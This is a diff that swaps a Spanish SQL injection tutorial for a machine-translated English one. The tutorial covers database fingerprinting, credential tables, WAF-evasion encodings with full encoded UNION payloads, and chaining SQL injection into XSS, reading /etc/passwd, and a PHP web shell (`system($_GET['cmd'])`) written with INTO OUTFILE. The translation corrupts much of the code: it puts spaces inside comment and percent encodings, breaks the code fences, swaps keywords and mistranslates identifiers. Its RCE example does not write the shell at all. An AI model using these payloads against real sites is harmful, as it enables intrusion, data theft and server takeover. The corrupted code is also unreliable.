@@ -1,354 +1,350 @@
+# INJECTION SQLi - Medium - Advanced
+## TOPICS
 
-# INYECCIÓN SQLi - Medio - Avanzado 
-## TEMAS
+* [Before starting] (# Before-starting)
+* [Sqli injections in different databases] (# sqli-injections-in-different-databases)
+    * [MySQL] (# MySQL)
+      * [Default databases] (# Default-databases)
+      * [Database Version] (# Database-Version)
+      * [Default credentials] (# Default-credentials)
+      * [Current database] (# current-database-database)
+      * [Server Hostname] (# Server-Hostname)
+    * [MySSQL] (# MySSQL)
+      * [Default-databases] (# Default-databases)
+      * [Database Version] (# Database-Version)
+      * [Default credentials] (# Default-credentials)
+      * [Current database] (# current-database-database)
+      * [Server Hostname] (# Server-Hostname)
+    * [Oracle] (# Oracle)
+      * [Default databases] (# Default-databases)
+      * [Database Version] (# Database-Version)
+      * [Default credentials] (# Default-credentials)
+      * [Current database] (# current-database-database)
+      * [Server Hostname] (# Server-Hostname)
+* [Types of payloads] (# Types-of-payloads)
+   * [Boolean-based blind] (# Boolean-based-blind)
+   * [Error-based] (# Error-based)
+   * [Union query-based] (# Union-query-based)
+   * [Stacked queries] (# Stacked-queries)
+   * [Time-based blind] (# Time-based-blind)
+   * [Inline queries] (# Inline-queries)
+* [Encodes] (# Encodes)
+   * [Encoding with comments] (# Encoding-with-comments)
+   * [URL-Encoding] (# URL-Encoding)
+   * [Uppercase and lowercase] (# Uppercase-and-lowercase)
+   * [Hex Encoding] (# Hex-Encoding)
+* [Create encoded-payloads] (# Create-encoded-payloads)
+* [Using sql functions to get information] (# Using-sql-functions-to-get-information)
+   * [RPAD] (# RPAD)
+   * [SOUNDS LIKE] (# SOUNDS-LIKE)
+   * [UPPER] (# UPPER)
+   * [REVERSE] (# REVERSE)
+   * [RIGHT] (# RIGHT)
+   * [ELT] (# ELT)
+   * [HEX] (# HEX)
+   * [HUNEX] (# HUNEX)
+   * [CASE] (# CASE)
+   * [IF] (# IF)
+   * [EXTRACTVALUE] (# EXTRACTVALUE)
+* [Moving from sql Injection to other vulnerabilities] (# Moving-from-sql-Injection-to-other-vulnerabilities)
+   * [From Sqli to XSS] (# From-Sqli-to-XSS)
+      * [XSS reflective] (# XSS-reflective)
+      * [Persistent XSS] (# persistent-XSS)
+   * [From Sqli to LFR] (# From-Sqli-to-LFR)
+   * [From Sqli to RCE] (# From-Sqli-to-RCE)
+   ## Before starting
 
-* [Antes de comenzar](#Antes-de-comenzar)
-* [Inyecciónes sqli en diferentes bases de datos](#Inyecciónes-sqli-en-diferentes-bases-de-datos)
-    * [MySQL](#MySQL)
-      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
-      * [Version de base de datos](#Version-de-base-de-datos)
-      * [Credenciales por defecto](#Credenciales-por-defecto)
-      * [Base de datos actual](#Base-de-datos-actual)
-      * [Server Hostname ](#Server-Hostname)
-    * [MySSQL](#MySSQL)
-      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
-      * [Version de base de datos](#Version-de-base-de-datos)
-      * [Credenciales por defecto](#Credenciales-por-defecto)
-      * [Base de datos actual](#Base-de-datos-actual)
-      * [Server Hostname ](#Server-Hostname)
-    * [Oracle](#Oracle)
-      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
-      * [Version de base de datos](#Version-de-base-de-datos)
-      * [Credenciales por defecto](#Credenciales-por-defecto)
-      * [Base de datos actual](#Base-de-datos-actual)
-      * [Server Hostname ](#Server-Hostname)
-* [Tipos de payloads](#Tipos-de-payloads)
-   * [Boolean-based blind](#Boolean-based-blind)
-   * [Error-based](#Error-based)
-   * [Union query-based](#Union-query-based)
-   * [Stacked queries](#Stacked-queries)
-   * [Time-based blind](#Time-based-blind)
-   * [Inline queries](#Inline-queries)
-* [Codificaciónes](#Codificaciónes)
-   * [Codificación con comentarios](#Codificación-con-comentarios)
-   * [Codificación URL](#Codificación-URL)
-   * [Mayusculas y minusculas](#Mayusculas-y-minusculas)
-   * [Codificación Hex](#Codificación-Hex)
-* [Crear payloads codificados](#Crear-payloads-codificados)
-* [Haciendo uso de funciones sql para obtener información](#Haciendo-uso-de-funciones-sql-para-obtener-información)
-   * [RPAD](#RPAD)
-   * [SOUNDS LIKE](#SOUNDS-LIKE)
-   * [UPPER](#UPPER)
-   * [REVERSE](#REVERSE)
-   * [RIGHT](#RIGHT)
-   * [ELT](#ELT)
-   * [HEX](#HEX)
-   * [HUNEX](#HUNEX)
-   * [CASE](#CASE)
-   * [IF](#IF)
-   * [EXTRACTVALUE](#EXTRACTVALUE)
-* [Pasando de Inyección sql a otras vulnerabilidades](#Pasando-de-Inyección-sql-a-otras-vulnerabilidades)
-   * [De Sqli a XSS](#De-Sqli-a-XSS)
-      * [XSS reflectivo](#XSS-reflectivo)
-      * [XSS persistente](#XSS-persistente)  
-   * [De Sqli a LFR](#De-Sqli-a-LFR)
-   * [De Sqli a RCE](#De-Sqli-a-RCE)
-   
-
-## Antes de comenzar
-
-Este escrito esta pensado como una continuación directa a mi anterior lectura de inyecciones sqli en donde se explican de manera un poco más general las bases de esta vulnerabilidad , por lo que si no estas al tanto de ella te recomiendo que primero le des un repaso antes de empezar esta lectura, ya que este escrito será un poco más avanzado.
+This writing is intended as a direct continuation of my previous reading of sqli injections where the bases of this vulnerability are explained in a little more general way, so if you are not aware of it I recommend that you first review it before to begin this reading, since this writing will be a little more advanced.
 
 
-## Inyecciónes sqli en diferentes bases de datos
+## sqli injections in different databases
 
-Vamos a empezar aclarando que una inyección sql no es igual en todas las bases de datos, si bien pueden ser un poco parecidas no son del todo igual, esto se debe a que cada base de datos tiene su propia sintaxis. 
+Let's start by clarifying that an sql injection is not the same in all databases, although they may be a bit similar, they are not entirely the same, this is because each database has its own syntax.
 
-Para dar un ejemplo de esto voy a tomar 3 bases de datos diferentes y trataré de mostrar las diferencias por separado, las bases de datos que vamos a ver son:
+To give an example of this I am going to take 3 different databases and try to show the differences separately, the databases that we are going to see are:
 
-```
+`` ''
 MySQL
 MSSQL
 ORACLE
-```
+`` ''
 
-La informacion que vamos a recopilar será la siguiente:
+The information that we are going to collect will be the following:
 
-```
+`` ''
 
-Bases de datos por defecto.
-Conocer la version de la base de datos.
-Bases de datos que contienen las credenciales por defecto.
-Conocer la base de datos en la que estamos.
-Conocer el Hostname del servidor.
-Tablas y columnas.
-Conocer los privilegios.
+Default databases.
+Know the version of the database.
+Databases containing the default credentials.
+Know the database in which we are.
+Know the hostname of the server.
+Tables and columns.
+Know the privileges.
 
-```
+`` ''
 
 ### MySQL
 
-#### Bases de datos por defecto
+#### Default databases
 
-```
-mysql 
+`` ''
+mysql
 information_schema
-```
-#### Version de base de datos
+`` ''
+#### Database version
 
-```
+`` ''
 VERSION()
 @@VERSION
-@@GLOBAL.VERSION
-```
+@@ GLOBAL VERSION
+`` ''
 
-#### Credenciales por defecto
+#### Default credentials
 
-En este caso la base de datos de MySQL tiene por defecto las credenciales en una tabla llamada: 
+In this case the MySQL database has by default the credentials in a table called:
 
-```
+`` ''
 mysql.user
-```
+`` ''
 
-Para ser mas exactos en las columnas: `user y password`
+To be more exact in the columns: `user and password`
 
-#### Base de datos actual
+#### Current database
 
-```
-database()
-schema()
-```
+`` ''
+database ()
+schema ()
+`` ''
 
-#### Server Hostname 
+#### Server Hostname
 
-```
-@@HOSTNAME
-```
+`` ''
+@@ HOSTNAME
+`` ''
 
 ### MySSQL
 
-#### Bases de datos por defecto.
+#### Default databases.
 
-```
+`` ''
 Model
 Msdb
 Tempdb
 Northwind
 Information_schema
-```
-#### Version de base de datos
+`` ''
+#### Database version
 
-```
+`` ''
 @@VERSION
-```
+`` ''
 
-#### Credenciales por defecto
+#### Default credentials
 
-En este caso la base de datos de MySSQL tiene por defecto las credenciales en 2 tablas llamadas: 
+In this case the MySSQL database has by default the credentials in 2 tables called:
 
-```
+`` ''
 master..syslogins
 master..sysprocesses
-```
+`` ''
 
-Para ser mas exactos en las columnas: `name y loginame`
+To be more exact in the columns: `name and loginame`
 
-#### Base de datos actual
+#### Current database
 
-```
-db_name()
-```
+`` ''
+db_name ()
+`` ''
 
-#### Server Hostname 
+#### Server Hostname
 
-```
-@@SERVERNAME
-SERVERPROPERTY()
-```
+`` ''
+@@ SERVERNAME
+SERVERPROPERTY ()
+`` ''
 
 ### Oracle
 
-#### Bases de datos por defecto.
+#### Default databases.
 
-```
+`` ''
 System
 Sysaux
-```
-#### Version de base de datos
+`` ''
+#### Database version
 
-```
+`` ''
 VERSION
-```
+`` ''
 
-#### Credenciales por defecto
+#### Default credentials
 
-En este caso la base de datos de MySQL tiene por defecto las credenciales en una tabla llamada: 
+In this case the MySQL database has by default the credentials in a table called:
 
-```
+`` ''
 all_users
-sys.user$
-```
+sys.user $
+`` ''
 
-Para ser mas exactos en las columnas: 
+To be more exact in the columns:
 
-```
+`` ''
 username
 
-name y password
-```
+name and password
+`` ''
 
-#### Base de datos actual
+#### Current database
 
-```
+`` ''
 global_name
-name
+yam
 instance_name
 SYS.DATABASE_NAME
-```
+`` ''
 
-#### Server Hostname 
+#### Server Hostname
 
-```
+`` ''
 host_name
 UTL_INADDR.get_host_name
-```
+`` ''
 
-## Tipos de payloads
+## Types of payloads
 
 ### Boolean-based blind
 
-Boolean-based blind significa que la vulnerabilidad se basa en valores booleanos (true or false) y se dice que es ciega por que no muetra alguna señal de que hay un error en la página.
+Boolean-based blind means that the vulnerability is based on Boolean values ​​(true or false) and is said to be blind because it does not show any sign that there is an error on the page.
 
 ### Error-based
 
-Error-based significa que la inyeccion se basa en los mensajes de error que el servidor responde y asi conocer un poco mas sobre la estructura de la base de datos que se esta usando.
+Error-based means that the injection is based on the error messages that the server responds and thus knows a little more about the structure of the database that is being used.
 
 ### Union query-based
 
-Union query-based significa que estamos aprovechando que el operador UNION de sql puede ser usado, gracias a esto podemos combinar declaraciones que serán visualizadas como parte de la respuesta del servidor.
+Union query-based means that we are taking advantage of the UNION operator from sql can be used, thanks to this we can combine statements that will be displayed as part of the server's response.
 
 ### Stacked queries
 
-Stacked queries significa que la vulneravilidad se basa en añadir mas consultas sql en serie, de esta manera mandar una consulta normal y al mismo tiempo mandar la consulta del atacante, todo esto solo dividiendo las consultas con un ";".
+Stacked queries means that the vulnerability is based on adding more sql queries in series, in this way sending a normal query and at the same time sending the attacker's query, all this only dividing the queries with a ";".
 
 ### Time-based blind
 
-Time-based blind es cuando la vulnerabilidad se basa en el tiempo, lo que significa que un atacante enviará una consulta sql obligano a la base de datos a esperar una cierta cantidad de tiempo, si el tiempo de respuesta del servidor es el mismo tiempo que el atacante declaró en la sentencia, esto significa que es vulnerable.
+Time-based blind is when the vulnerability is time-based, which means that an attacker will send an sql query forcing the database to wait a certain amount of time, if the server response time is the same time as the attacker stated in the sentence, this means that he is vulnerable.
 
 ### Inline queries
 
-Inline queries consiste en unir una query sql dentro de otra y asi sucesivamente para ver si la sentencia es ejecutada.
+Inline queries consists of joining an sql query within another and so on to see if the statement is executed.
 
 
-## Codificaciónes 
+## Encodings
 
-Unos de los métodos más importantes que tenemos que tomar en cuenta al momento de hacer un testeo en una inyección sqli son las codificaciónes, las cuales nos ayudarán a que un payload pueda ser filtrado por algunos waf.
+One of the most important methods that we have to take into account when testing an sqli injection are the encodings, which will help us so that a payload can be filtered by some wafs.
 
-### Codificación con comentarios 
+### Coding with comments
 
-Este tipo de codificacion, como dice su nombre es usar la sintaxis para comentarios de sql, la cual es la siguiente:
+This type of encoding, as its name says, is to use the sql comment syntax, which is the following:
 
-```
-/* */
+`` ''
+/ * * /
 
-/* Todo que que esta encerrado aquí es un comentario */
+/ * Everything that is enclosed here is a comment * /
 
-```
+`` ''
 
-Ejemplo:
+Example:
 
- `/*!UNION*/ /*!SELECT*/ 1`
+ `/ *! UNION * / / *! SELECT * / 1`
  
-###  Codificación URL 
+ ### URL encoding
 
-La codificación URL reemplaza los espacios con un signo “+”, y algunos caracteres
-ASCII con un signo “%” seguido por su equivalente en hexadecimal.
+URL encoding replaces spaces with a "+" sign, and some characters
+ASCII with a “%” sign followed by its hexadecimal equivalent.
 
-```
+`` ''
 union select:
 
-u	= %75
-n	= %6e
-i	= %69
-o	= %6f
-n	= %6e
-space	= %20
-s	= %73
-e	= %65
-l	= %6c
-c	= %63
-t	= %74
-```
+u =% 75
+n =% 6e
+i =% 69
+o =% 6f
+n =% 6e
+space =% 20
+s =% 73
+e =% 65
+l =% 6c
+c =% 63
+t =% 74
+`` ''
 
-Ejemplo:
+Example:
 
-`%55nion %53elect 1`
+`% 55nion% 53elect 1`
 
-### Mayusculas y minusculas
+### Upper case and lower case
 
-También podemos utilizár el método de mezclar mayusculas y minusculas para ver si podemos podemos evadir algunos filtros.
+We can also use the method of mixing upper and lower case to see if we can evade some filters.
 
-Ejemplo:
+Example:
 
-`UniOn SeLeCt 1`
+`SeLeCt Union 1`
 
-### Codificación Hex
+### Hex Encoding
 
-Esto se basa en codificar el método de comentarios que vimos antes en codigo hex:
+This is based on encoding the comments method we saw earlier in hex code:
 
-`/%2A%2A/ y %2F**%2F`
+`/% 2A% 2A / y% 2F **% 2F`
 
-Ejemplo:
+Example:
 
-```
-/%2A%2A/union/%2A%2A/select/%2A%2A/1
+`` ''
+/% 2A% 2A / union /% 2A% 2A / select /% 2A% 2A / 1
 
-%2F**%2Funion%2F**%2Fselect%2F**%2F1
-```
+% 2F **% 2Funion% 2F **% 2Fselect% 2F **% 2F1
+`` ''
  
-## Crear payloads codificados
+## Create encoded payloads
 
-En esta parte me gustaría dar un ejemplo de como crear un payload codificado.
+In this part I would like to give an example of how to create an encoded payload.
 
-Primero vamos a definir el payload que queremos codificar:
+First we are going to define the payload that we want to encode:
 
-``` 
-union select 1,2,3,concat(table_name),5 from information_schema.tables where table_schema = database()
+`` ''
+union select 1,2,3, concat (table_name), 5 from information_schema.tables where table_schema = database ()
 
-```
+`` ''
 
-En este caso estamos usando el payload sin ningun tipo de codificacion, pero tenemos mas maneras de declarar el payload, esto cambiando su sintaxis y añadiendo otras cosas aun sin codificar, por ejemplo:
+In this case we are using the payload without any coding, but we have more ways to declare the payload, this by changing its syntax and adding other things even without coding, for example:
 
-``` 
-union all(select 1,2,3,concat(table_name),5) from information_schema.tables where table_schema = database()
+`` ''
+union all (select 1,2,3, concat (table_name), 5) from information_schema.tables where table_schema = database ()
 
-```
+`` ''
 
-Para empezar a codificar vamos a utilizar primero el método de comentarios:
-
-
-``` 
-/*!50000union*//**//*!50000all/*(/*!50000select*//**/1,2,3,/*!50000concat*/(table_name),5)/**//*!50000from*//**//*!50000information_schema.tables*//**//*!50000where*//**//*!50000table_schema*/=database()
-
-```
-
-Ahora ya lo tenemos codificado con comentarios, pero podemos mezclar codificaciones, por ejemplo con el método de URL:
-
-``` 
-/*!50000%75%6e%69on*//**//*!50000all/*(/*!50000%73%65%6cect*//**/1,2,3,/*!50000%63oncat*/(table_name),5)/**//*!50000%66rom*//**//*!50000%69nformation_schema.tables*//**//*!50000wh%65re*//**//*!50000table_schema*/=database()
-
-```
-
-De esta manera podemos evadir filtros y jugar con diferentes codificaciones y mezclas.
+To start coding, we are going to use the comments method first:
 
 
-## Haciendo uso de funciones sql para obtener información
+`` ''
+/ *! 50000union * // ** // *! 50000all / * (/ *! 50000select * // ** / 1,2,3, / *! 50000concat * / (table_name), 5) / ** // *! 50000from * // ** // *! 50000information_schema.tables * // ** // *! 50000where * // ** // *! 50000table_schema * / = database ()
 
-El lenguaje SQL tiene funciones incorporadas para hacer cálculos sobre los datos. Claro ese el uso "Oficial" de ellas, pero estamos en un escrito de inyecciones sql asi que vamos a darles un uso para este caso.
+`` ''
 
-Para este ejemplo utilizarémos las siguientes funciones:
+Now we have it encoded with comments, but we can mix encodings, for example with the URL method:
 
-```
+`` ''
+/ *! 50,000% 75% 6e% 69on * // ** // *! 50,000all / * (/ *! 50,000% 73% 65% 6cect * // ** / 1,2,3, / *! 50,000% 63oncat * / (table_name), 5) / ** // *! 50000% 66rom * // ** // *! 50000% 69nformation_schema.tables * // ** // *! 50000wh% 65re * // ** // *! 50000table_schema * / = database ()
+
+`` ''
+
+In this way we can evade filters and play with different encodings and mixes.
+
+## Using sql functions to get information
+
+The SQL language has built-in functions for doing calculations on the data. Of course that is the "Official" use of them, but we are in a script of sql injections so we are going to give them a use for this case.
+
+For this example we will use the following functions:
+
+`` ''
 RPAD
 SOUNDS LIKE
 UPPER
@@ -360,161 +356,161 @@ HUNEX
 CASE
 IF
 EXTRACTVALUE
-```
+`` ''
 
 ### RPAD
 
-Vamos a empezar con la funcion RPAD la cual devuelve la expr1 rellena por la derecha con la secuencia de caracteres de expr2 y con n caracteres de longitud. Esta función es útil para dar formato a la salida de una consulta.
+We are going to start with the RPAD function which returns the expr1 padded on the right with the sequence of characters from expr2 and with n characters in length. This function is useful for formatting the output of a query.
 
-su sintaxis es `RPAD(str, len [, padstr])`
+its syntax is `RPAD (str, len [, padstr])`
 
-Un ejemplo de su uso en una inyección sql:
+An example of its use in a sql injection:
  
-`SELECT RPAD(table_name,50,'.') from information_schema.tables`
+`SELECT RPAD (table_name, 50, '.') From information_schema.tables`
 
-### SOUNDS LIKE 
+### SOUNDS LIKE
 
-Esta función puede ser usada para remplazar el simbolo = 
+This function can be used to replace the symbol =
 
-Ejemplo:
+Example:
 
-`SELECT concar(table_name) from information_schema.tables where table_schema sounds like database()`
+`SELECT concar (table_name) from information_schema.tables where table_schema sounds like database ()`
 
 ### UPPER
  
-Sintaxis: `UPPER(str)`
+Syntax: `UPPER (str)`
 
-Ejemplo:
+Example:
 
-`select upper(table_name)from information_schema.tables`
+`select upper (table_name) from information_schema.tables`
 
 
 ### REVERSE
 
-Sintaxis: `REVERSE(str)`
+Syntax: `REVERSE (str)`
 
-Ejemplo:
+Example:
 
-`Select reverse(reverse(table_Name)) from information_schema.tables`
+`Select reverse (reverse (table_Name)) from information_schema.tables`
 
-NOTA: se utiliza doble reversa para que la información quede de manera entendible 
+NOTE: double reverse is used so that the information is understandable
 
 ### RIGHT
 
-sintaxis: `RIGHT(str,len)`
+syntax: `RIGHT (str, len)`
 
-Ejemplo: 
+Example:
 
-`select right(table_name, 100) from information_schema.tables`
+`select right (table_name, 100) from information_schema.tables`
 
-### ELT 
+### ELT
 
-Sintaxis: `ELT(N, str1[, str2, str3,...])`
+Syntax: `ELT (N, str1 [, str2, str3, ...])`
 
-Ejemplo:
+Example:
 
-`Select elt(1, table_Name) from information_schema.tables`
+`Select elt (1, table_Name) from information_schema.tables`
 
 ### HEX
 
-Sintaxis: `HEX(N_or_S)`
+Syntax: `HEX (N_or_S)`
 
-Ejemplo:
+Example:
 
-`Select hex( table_Name) from information_schema.tables`
+`Select hex (table_Name) from information_schema.tables`
 
 ### HUNEX
 
-Sintaxis: `UNHEX(str)`
+Syntax: `UNHEX (str)`
 
-Ejemplo: `Select unhex(hex( table_Name)) from information_schema.tables`
+Example: `Select unhex (hex (table_Name)) from information_schema.tables`
 
 ### CASE
 
-Ejemplo: `SELECT CASE WHEN (1=1) THEN table_name ELSE false END from information_schema.tables`
+Example: `SELECT CASE WHEN (1 = 1) THEN table_name ELSE false END from information_schema.tables`
 
 ### IF
 
-Ejemplo: `SELECT if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>') from information_schema.tables`
+Example: `SELECT if (1 = 1, table_name, '<h3> <font color = blue> Tables: </h3>') from information_schema.tables`
 
 ### EXTRACTVALUE
 
-Sintaxis: `EXTRACTVALUE(xml_frag, xpath_expr)`
+Syntax: `EXTRACTVALUE (xml_frag, xpath_expr)`
 
-Ejemplo: `SELECT extractvalue(rand(),concat(0x7e,version(),0x7e,user()))`
+Example: `SELECT extractvalue (rand (), concat (0x7e, version (), 0x7e, user ()))`
 
-Con esto en mente, podemos mezclar entre funciones, diferentes tipos de codificacion y diferente sintaxis en las secuencias de sql para crear payloads cada vez más personalizados.
+With this in mind, we can mix between functions, different types of coding and different syntax in the sql sequences to create increasingly personalized payloads.
 
 
-## Pasando de Inyección sql a otras vulnerabilidades
+## Moving from sql Injection to other vulnerabilities
 
-### De Sqli a XSS
+### From Sqli to XSS
 
-Cuando tenemos una página vulnerable a inyección sql esta también es vulnerable a inyecciones sql,lo cual puede ser desde el parametro vulnerable pero en este caso vamos a aprobechar la inyección sql para inyectar xss, esto puede ser de 2 maneras:
+When we have a page vulnerable to sql injection it is also vulnerable to sql injections, which can be from the vulnerable parameter but in this case we are going to use sql injection to inject xss, this can be in 2 ways:
 
-#### XSS reflectivo   
+#### Reflective XSS
 
-En la columna vulnerable vamos a inyectar el payload xss que queramos.
+In the vulnerable column we are going to inject the xss payload that we want.
 
-"IMPORTANTE" lo tenemos que pasar a hex.
+"IMPORTANT" we have to move to hex.
 
-Para el ejemplo vamos a usar este payload:
+For the example we are going to use this payload:
 
-`<script>alert("_Y000!_")</script>`
+`<script> alert (" _ Y000! _ ") </script>`
 
-Ahora en HEX:
+Now in HEX:
 
 `0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e`
 
-Ejemplo:
+Example:
 
-`union+select+1,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,3+--+`
+`union + select + 1,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e, 3 + - +`
 
-De esta manera estamos haciendo un xss reflectivo.
+In this way we are doing a reflective xss.
 
-#### XSS persistente
+#### persistent XSS
 
-Para un xss persistente necesitamos tener permisos de escritura, todo va bien y la página vulnerable nos da permisos tenemos que hacer lo siguiente:
+For a persistent xss we need to have write permissions, everything is fine and the vulnerable page gives us permissions we have to do the following:
 
-Haciendo uso de la funcion INTO OUTFILE vamos a escribir un archivo en la raiz de la página.
+Using the INTO OUTFILE function we are going to write a file at the root of the page.
 
-Ejemplo:
+Example:
 
-`union+select+1,'<script>alert("_Y000!_")</script>',3+INTO+OUTFILE+'ruta/nombre.html'+--+`
+`union + select + 1, '<script> alert (" _ Y000! _ ") </script>', 3 + INTO + OUTFILE + 'path / name.html' + - +`
 
-Y con eso vamos a crear un archivo .html con nuestro XSS persistente.
+And with that we are going to create an .html file with our persistent XSS.
 
-### De Sqli a LFR
+### From Sqli to LFR
 
-Sql tambien tiene una funcion que nos permite cargar archivos locales y con eso podemos leer archivos a los que normalmente no deberiamos tener acceso 
+Sql also has a function that allows us to load local files and with that we can read files that we should not normally have access to.
 
-Ejemplo: `union all select load_file(‘/etc/passwd’)`
+Example: `union all select load_file ('/ etc / passwd')`
 
-### De Sqli a RCE
+### From Sqli to RCE
 
-Usando el mismo metodo con el que hicimos un xss persistente vamos a hacer lo siguiente:
+Using the same method with which we did a persistent xss we are going to do the following:
 
-Vamos a inyectar codigo php con el cual vamos a generar una shell con la que vamos a poder ejecutar comandos dentro del servidor vulnerable
+We are going to inject php code with which we are going to generate a shell with which we are going to be able to execute commands within the vulnerable server
 
-Codigo:  `'<?php system($_GET["cmd"]); ?>'`
+Code: `'<? Php system ($ _ GET [" cmd "]); ?> '' '
 
-Lo vamos a inyectar usando un:
+We are going to inject it using a:
 
-INTO+OUTFILE+'ruta/nombre.php'
+INTO + OUTFILE + 'path / name.php'
 
-Ejemplo: 
+Example:
 
-`union+select+1,'load_file(‘/etc/passwd’)',3+INTO+OUTFILE+'ruta/nombre.php'+--+`
+`union + select + 1, 'load_file (' / etc / passwd ')', 3 + INTO + OUTFILE + 'path / name.php' + - +`
 
-Por ultimo, para usarlo vamos a la siguiente ruta:
+Finally, to use it we go to the following route:
 
-`http://vulnerable.com/nombre.php?=ls`
+`http: //vulnerable.com/name.php? = ls`
 
-Como pueden ver, estamos haciendo uso de la shell que inyectamos para ejecutar los comandos.
+As you can see, we are using the shell that we inject to execute the commands.
 
-Para verlo un poco mas grafico, pueden verlo desde aqui: https://twitter.com/_Y000_/status/1249877772979384320
+To see it a little more graphic, you can see it from here: https://twitter.com/_Y000_/status/1249877772979384320
 
-------------------------------------------- 
+-------------------------------------------
 
 
-Muchas gracias por dedicarle el tiempo! si tienes alguna sugerencia con gusto puedes decirmela! 
+Thank you very much for taking the time! If you have any suggestions, you can gladly tell me!
